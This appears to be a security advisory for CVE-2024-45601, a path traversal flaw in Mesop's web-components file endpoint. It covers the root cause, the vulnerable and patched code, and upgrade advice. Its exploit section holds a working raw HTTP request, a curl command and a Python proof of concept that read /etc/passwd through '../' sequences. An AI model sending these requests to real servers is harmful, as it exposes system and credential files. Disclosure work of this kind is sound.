1. Detailed Summary  
   • CVE ID: CVE-2024-45601  
   • Affected Software: Mesop  
   • Affected Version: 0.9.0  
   • Vulnerability Type:  
     – CWE-22: Improper Limitation of a Pathname to a Restricted Directory (Path Traversal)  
     – CWE-20: Improper Input Validation  
   • Description: Mesop’s “web components” static-file endpoint did not properly validate user-supplied paths or restrict which file types could be served. An attacker could craft requests including “../” sequences or direct file names (e.g. `/__web-components-module__/../../../../etc/passwd` or `/__web-components-module__/secret_config.yaml`) and retrieve files from anywhere on the filesystem, including sensitive server files not meant to be public.

2. Root Cause Analysis  
   The vulnerable code is in mesop/server/static_file_serving.py, function serve_web_components(path: str). Prior to the patch, it simply did:  
   ```python
   def serve_web_components(path: str):
       if has_runfiles():
           serving_path = get_runfile_location(path)
       else:
           # Unsafe disallowed path-join
           serving_path = os.path.join(os.getcwd(), path)
       return send_file_compressed(serving_path, disable_gzip_cache=disable_gzip_cache)
   ```
   Root causes:  
   • No normalization or “safe join” on the user-supplied `path`. Using plain os.path.join allowed “..” segments to escape the intended web-components directory.  
   • No check that `path` refers only to allowed file types. All extensions were served (e.g. `.py`, `.yaml`, `.env`).  
   • No check that `serving_path` was non-empty or existed before sending.  

   An attacker with network access and no credentials could request arbitrary filesystem paths under the Mesop app’s working directory or its runfiles area.  

3. Exploit Overview and Steps  
   In this vulnerability an attacker sends an HTTP GET to the Mesop application’s web-components module endpoint, supplying a crafted path to a sensitive file. Because path traversal (`..`) segments aren’t rejected, the server will read and return any file the process user can access.  

   Example exploit steps:  
   1. Identify the exposed endpoint:  
      • The path prefix is `__web-components-module__` by default.  
   2. Craft a URL containing path-traversal sequences or direct file references. For instance, to read `/etc/passwd` on a Linux host:  
      ```
      GET /__web-components-module__/../../../../etc/passwd HTTP/1.1
      Host: target.example.com
      Connection: close
      ```
   3. Send the request (e.g., using curl):  
      ```
      curl -v http://target.example.com/__web-components-module__/../../../../etc/passwd
      ```
   4. Observe a 200 OK response and the contents of `/etc/passwd` in the response body.  

   If the attacker knows relative paths to Mesop application data or configuration, they can exfiltrate private keys, credentials, environment files, or any file the Mesop process user can read.  

   Proof-of-concept request (Python):  
   ```python
   import requests

   target = "http://target.example.com"
   # Attempt to read /etc/passwd
   path = "../../../../etc/passwd"
   url = f"{target}/__web-components-module__/{path}"
   r = requests.get(url)
   print("Status:", r.status_code)
   print("Response body:")
   print(r.text)
   ```  

Patch Highlights (mesop/server/static_file_serving.py)  
• Switched to a safe join to prevent directory escapes.  
• Whitelisted extensions to “.js” and “.css” only.  
• Rejected requests for missing files or unexpected file types.
//
// After patch:
```python
def serve_web_components(path: str):
    serving_path = (
        get_runfile_location(path)
        if has_runfiles()
        else safe_join(os.getcwd(), path)  
    )

    # Only allow .js and .css
    file_name = os.path.basename(path)
    file_extension = os.path.splitext(file_name)[1].lower()
    allowed_extensions = {".js", ".css"}
    if file_extension not in allowed_extensions:
        raise MesopException(
            f"Unexpected file type: {file_extension}. "
            f"Only {', '.join(allowed_extensions)} files are allowed."
        )

    if not serving_path:
        raise MesopException("Unexpected request to " + path)

    return send_file_compressed(
        serving_path,
        disable_gzip_cache=disable_gzip_cache,
    )
```
This patch enforces:
• Path normalization (no `..` escapes).  
• Extension check (reject `.py`, `.yaml`, etc.).  
• Existence check (non-empty `serving_path`).  

Mesop 0.12.4 includes this fix. Users should upgrade immediately to eliminate this high-severity path traversal and local file inclusion vulnerability.